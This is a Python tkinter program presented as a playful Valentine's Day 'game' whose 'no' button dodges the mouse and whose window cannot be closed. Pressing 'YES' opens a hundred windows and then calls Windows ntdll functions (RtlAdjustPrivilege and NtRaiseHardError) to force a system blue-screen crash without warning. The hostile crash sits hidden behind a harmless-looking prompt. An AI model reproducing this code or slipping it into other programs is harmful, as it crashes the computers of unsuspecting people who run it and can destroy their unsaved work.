import tkinter as tk
import random

from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref


def on_button1_click():
    for _ in range(100):
        new_window = tk.Toplevel(root)
        new_window.title("Yay")
        new_window.geometry("200x100")
        label = tk.Label(new_window, text="Yay")
        label.pack(pady=20)
    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(
    c_uint(19), 
    c_uint(1), 
    c_uint(0), 
    byref(c_int())
    )
    windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B), 
    c_ulong(0), 
    nullptr, 
    nullptr, 
    c_uint(6), 
    byref(c_uint())
    )    




def on_button2_click():
    print("Button 2 clicked")

def on_button2_hover(event):
    global previous_positions

    # Get the current mouse position
    mouse_x, mouse_y = event.x_root, event.y_root

    # Define the minimum distance the button should move away from the cursor
    min_distance = 200

    # Generate new x and y positions far from the current mouse position
    new_x = random.randint(0, root.winfo_width() - button2.winfo_width())
    new_y = random.randint(0, root.winfo_height() - button2.winfo_height())

    # Ensure the new position is far from the current mouse position and not in previous positions
    while (new_x, new_y) in previous_positions or abs(new_x - mouse_x) < min_distance or abs(new_y - mouse_y) < min_distance:
        new_x = random.randint(0, root.winfo_width() - button2.winfo_width())
        new_y = random.randint(0, root.winfo_height() - button2.winfo_height())

    # Update the button position and store the new position
    button2.place(x=new_x, y=new_y)
    previous_positions.add((new_x, new_y))

# Create the main window
root = tk.Tk()
root.title("Max's so called game :3")

root.geometry("720x480")

label = tk.Label(root, text="Will you be my valentine? :3")
label.place(x=10, y=10)

# Create two buttons
button1 = tk.Button(root, text="YES", command=on_button1_click, width=10, height=2)
button2 = tk.Button(root, text="no", command=on_button2_click, width=10, height=2)

# Use place to position the buttons
button1.place(x=100, y=100)
button2.place(x=200, y=100)

# Initialize a set to store previous positions of button2
previous_positions = set()
previous_positions.add((200, 100))

# Bind the hover event to button2
button2.bind("<Enter>", on_button2_hover)

# Override the window's close protocol
def disable_close():
    pass

root.protocol("WM_DELETE_WINDOW", disable_close)

# Run the application
root.mainloop()